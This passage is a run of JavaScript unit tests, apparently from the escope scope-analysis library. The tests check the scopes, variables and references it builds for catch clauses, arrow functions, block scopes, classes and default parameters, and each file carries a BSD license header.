expect(scope.type).to.be.equal('function');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true;<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].resolved).to.be.equal(scope.variables[0]);<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2015 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import esprima from 'esprima';<\n>+import { analyze } from '..';<\n>+describe('catch'<c> function() {<\n>+    it('creates scope'<c> function() {<\n>+        const ast = esprima.parse(`<\n>+            (function () {<\n>+                try {<\n>+                } catch (e) {<\n>+                }<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast);<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        const globalScope = scopeManager.scopes[0];<\n>+        expect(globalScope.type).to.be.equal('global');<\n>+        expect(globalScope.variables).to.have.length(0);<\n>+        expect(globalScope.references).to.have.length(0);<\n>+        let scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.isArgumentsMaterialized()).to.be.false;<\n>+        expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('catch');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('e');<\n>+        expect(scope.isArgumentsMaterialized()).to.be.true;<\n>+        expect(scope.references).to.have.length(0);<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { parse } from '../third_party/esprima';<\n>+import { analyze } from '..';<\n>+describe('ES6 arrow function expression'<c> function() {<\n>+    it('materialize scope for arrow function expression'<c> function() {<\n>+        const ast = parse(`<\n>+            var arrow = () => {<\n>+                let i = 0;<\n>+                var j = 20;<\n>+                console.log(i);<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('ArrowFunctionExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(2);<\n>+        // There's no ""arguments""<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        expect(scope.variables[1].name).to.be.equal('j');<\n>+    });<\n>+    it('generate bindings for parameters'<c> function() {<\n>+        const ast = parse(`var arrow = (a<c> b<c> c<c> d) => {}`);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('ArrowFunctionExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(4);<\n>+        // There's no ""arguments""<\n>+        expect(scope.variables[0].name).to.be.equal('a');<\n>+        expect(scope.variables[1].name).to.be.equal('b');<\n>+        expect(scope.variables[2].name).to.be.equal('c');<\n>+        expect(scope.variables[3].name).to.be.equal('d');<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { parse } from '../third_party/esprima';<\n>+import { analyze } from '..';<\n>+describe('ES6 block scope'<c> function() {<\n>+    it('let is materialized in ES6 block scope#1'<c> function() {<\n>+        const ast = parse(`<\n>+            {<\n>+                let i = 20;<\n>+                i;<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);  // Program and BlcokStatement scope.<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.variables).to.have.length(0);  // No variable in Program scope.<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);  // `i` in block scope.<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>+        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>+    });<\n>+    it('let is materialized in ES6 block scope#2'<c> function() {<\n>+        const ast = parse(`<\n>+            {<\n>+                let i = 20;<\n>+                var i = 20;<\n>+                i;<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);  // Program and BlcokStatement scope.<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.variables).to.have.length(1);  // No variable in Program scope.<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);  // `i` in block scope.<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('i');<\n>+        expect(scope.references[1].identifier.name).to.be.equal('i');<\n>+        expect(scope.references[2].identifier.name).to.be.equal('i');<\n>+    });<\n>+    it('function delaration is materialized in ES6 block scope'<c> function() {<\n>+        const ast = parse(`<\n>+            {<\n>+                function test() {<\n>+                }<\n>+                test();<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.variables).to.have.length(0);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('test');<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('test');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.references).to.have.length(0);<\n>+    });<\n>+    it('let is not hoistable#1'<c> function() {<\n>+        const ast = parse(`<\n>+            var i = 42; (1)<\n>+            {<\n>+                i;  // (2) ReferenceError at runtime.<\n>+                let i = 20;  // (2)<\n>+                i;  // (2)<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(2);<\n>+        const globalScope = scopeManager.scopes[0];<\n>+        expect(globalScope.type).to.be.equal('global');<\n>+        expect(globalScope.variables).to.have.length(1);<\n>+        expect(globalScope.variables[0].name).to.be.equal('i');<\n>+        expect(globalScope.references).to.have.length(1);<\n>+        const scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].resolved).to.be.equal(scope.variables[0]);<\n>+        expect(scope.references[1].resolved).to.be.equal(scope.variables[0]);<\n>+        expect(scope.references[2].resolved).to.be.equal(scope.variables[0]);<\n>+    });<\n>+    it('let is not hoistable#2'<c> function() {<\n>+        const ast = parse(`<\n>+            (function () {<\n>+                var i = 42; // (1)<\n>+                i;  // (1)<\n>+                {<\n>+                    i;  // (3)<\n>+                    {<\n>+                        i;  // (2)<\n>+                        let i = 20;  // (2)<\n>+                        i;  // (2)<\n>+                    }<\n>+                    let i = 30;  // (3)<\n>+                    i;  // (3)<\n>+                }<\n>+                i;  // (1)<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(4);<\n>+        const globalScope = scopeManager.scopes[0];<\n>+        expect(globalScope.type).to.be.equal('global');<\n>+        expect(globalScope.variables).to.have.length(0);<\n>+        expect(globalScope.references).to.have.length(0);<\n>+        let scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.variables).to.have.length(2);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.variables[1].name).to.be.equal('i');<\n>+        const v1 = scope.variables[1];<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].resolved).to.be.equal(v1);<\n>+        expect(scope.references[1].resolved).to.be.equal(v1);<\n>+        expect(scope.references[2].resolved).to.be.equal(v1);<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        const v3 = scope.variables[0];<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].resolved).to.be.equal(v3);<\n>+        expect(scope.references[1].resolved).to.be.equal(v3);<\n>+        expect(scope.references[2].resolved).to.be.equal(v3);<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('i');<\n>+        const v2 = scope.variables[0];<\n>+        expect(scope.references).to.have.length(3);<\n>+        expect(scope.references[0].resolved).to.be.equal(v2);<\n>+        expect(scope.references[1].resolved).to.be.equal(v2);<\n>+        expect(scope.references[2].resolved).to.be.equal(v2);<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { parse } from '../third_party/esprima';<\n>+import { analyze } from '..';<\n>+describe('ES6 catch'<c> function() {<\n>+    it('takes binding pattern'<c> function() {<\n>+        const ast = parse(`<\n>+            try {<\n>+            } catch ({ a<c> b<c> c<c> d }) {<\n>+                let e = 20;<\n>+                a;<\n>+                b;<\n>+                let c = 30;<\n>+                c;<\n>+                d;<\n>+            }<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(4);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.block.type).to.be.equal('BlockStatement');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('catch');<\n>+        expect(scope.block.type).to.be.equal('CatchClause');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        // FIXME After Esprima's bug is fixed<c> I'll add tests #33<\n>+        // https://github.com/estools/escope/issues/33#issuecomment-64135832<\n>+        //<\n>+        // expect(scope.variables).to.have.length(4);<\n>+        // expect(scope.variables[0].name).to.be.equal('a');<\n>+        // expect(scope.variables[1].name).to.be.equal('b');<\n>+        // expect(scope.variables[2].name).to.be.equal('c');<\n>+        // expect(scope.variables[3].name).to.be.equal('d');<\n>+        // expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[3];<\n>+        expect(scope.type).to.be.equal('block');<\n>+        expect(scope.block.type).to.be.equal('BlockStatement');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(2);<\n>+        expect(scope.variables.map(variable => variable.name)).to.be.eql([<\n>+            'e'<c><\n>+            'c'<\n>+        ]);<\n>+        expect(scope.references.map(ref => ref.identifier.name)).to.be.eql([<\n>+            'e'<c><\n>+            'a'<c><\n>+            'b'<c><\n>+            'c'<c><\n>+            'c'<c><\n>+            'd'<\n>+        ]);<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import { parse } from '../third_party/esprima';<\n>+import { analyze } from '..';<\n>+describe('ES6 class'<c> function() {<\n>+    it('declaration name creates class scope'<c> function() {<\n>+        const ast = parse(`<\n>+            class Derived extends Base {<\n>+                constructor() {<\n>+                }<\n>+            }<\n>+            new Derived();<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('Derived');<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>+        expect(scope.references[1].identifier.name).to.be.equal('Derived');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('class');<\n>+        expect(scope.block.type).to.be.equal('ClassDeclaration');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('Derived');<\n>+        expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.references).to.have.length(0);<\n>+    });<\n>+    it('expression name creates class scope#1'<c> function() {<\n>+        const ast = parse(`<\n>+            (class Derived extends Base {<\n>+                constructor() {<\n>+                }<\n>+            });<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('class');<\n>+        expect(scope.block.type).to.be.equal('ClassExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(1);<\n>+        expect(scope.variables[0].name).to.be.equal('Derived');<\n>+        expect(scope.references).to.have.length(0);<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>+    });<\n>+    it('expression name creates class scope#2'<c> function() {<\n>+        const ast = parse(`<\n>+            (class extends Base {<\n>+                constructor() {<\n>+                }<\n>+            });<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('Base');<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('class');<\n>+        expect(scope.block.type).to.be.equal('ClassExpression');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>+    });<\n>+    it('computed property key may refer variables'<c> function() {<\n>+        const ast = parse(`<\n>+            (function () {<\n>+                var yuyushiki = 42;<\n>+                (class {<\n>+                    [yuyushiki]() {<\n>+                    }<\n>+                    [yuyushiki + 40]() {<\n>+                    }<\n>+                });<\n>+            }());<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(5);<\n>+        let scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        scope = scopeManager.scopes[1];<\n>+        expect(scope.type).to.be.equal('function');<\n>+        expect(scope.block.type).to.be.equal('FunctionExpression');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(2);<\n>+        expect(scope.variables[0].name).to.be.equal('arguments');<\n>+        expect(scope.variables[1].name).to.be.equal('yuyushiki');<\n>+        expect(scope.references).to.have.length(1);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('yuyushiki');<\n>+        scope = scopeManager.scopes[2];<\n>+        expect(scope.type).to.be.equal('class');<\n>+        expect(scope.block.type).to.be.equal('ClassExpression');<\n>+        expect(scope.isStrict).to.be.true;<\n>+        expect(scope.variables).to.have.length(0);<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('yuyushiki');<\n>+        expect(scope.references[1].identifier.name).to.be.equal('yuyushiki');<\n>+    });<\n>+    it('regression #49'<c> function() {<\n>+        const ast = parse(`<\n>+            class Shoe {<\n>+                constructor() {<\n>+                    //Shoe.x = true;<\n>+                }<\n>+            }<\n>+            let shoe = new Shoe();<\n>+        `);<\n>+        const scopeManager = analyze(ast<c> {ecmaVersion: 6});<\n>+        expect(scopeManager.scopes).to.have.length(3);<\n>+        const scope = scopeManager.scopes[0];<\n>+        expect(scope.type).to.be.equal('global');<\n>+        expect(scope.block.type).to.be.equal('Program');<\n>+        expect(scope.isStrict).to.be.false;<\n>+        expect(scope.variables).to.have.length(2);<\n>+        expect(scope.variables[0].name).to.be.equal('Shoe');<\n>+        expect(scope.variables[1].name).to.be.equal('shoe');<\n>+        expect(scope.references).to.have.length(2);<\n>+        expect(scope.references[0].identifier.name).to.be.equal('shoe');<\n>+        expect(scope.references[1].identifier.name).to.be.equal('Shoe');<\n>+    });<\n>+// vim: set sw=4 ts=4 et tw=80 :<\n>+// -*- coding: utf-8 -*-<\n>+//  Copyright (C) 2015 Toru Nagashima<\n>+//<\n>+//  Redistribution and use in source and binary forms<c> with or without<\n>+//  modification<c> are permitted provided that the following conditions are met:<\n>+//<\n>+//    * Redistributions of source code must retain the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer.<\n>+//    * Redistributions in binary form must reproduce the above copyright<\n>+//      notice<c> this list of conditions and the following disclaimer in the<\n>+//      documentation and/or other materials provided with the distribution.<\n>+//<\n>+//  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+//  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+//  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+//  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+//  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+//  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+//  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+//  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+//  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+//  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+import { expect } from 'chai';<\n>+import espree from '../third_party/espree';<\n>+import { analyze } from '..';<\n>+describe('ES6 default parameters:'<c> function() {<\n>+    describe('a default parameter creates a writable reference for its initialization:'<c> function() {<\n>+        const patterns = {<\n>+            FunctionDeclaration: `function foo(a<c> b = 0) {}`<c><\n>+            FunctionExpression: `let foo = function(a<c> b = 0) {};`<c><\n>+            ArrowExpression: `let foo = (a<c> b = 0) => {};`<\n>+        };<\n>+        for (const name in patterns) {<\n>+            const code = patterns[name];<\n>+            (function(name<c> code) {<\n>+                it(name<c> function() {<\n>+                    const numVars = name === 'ArrowExpression' ? 2 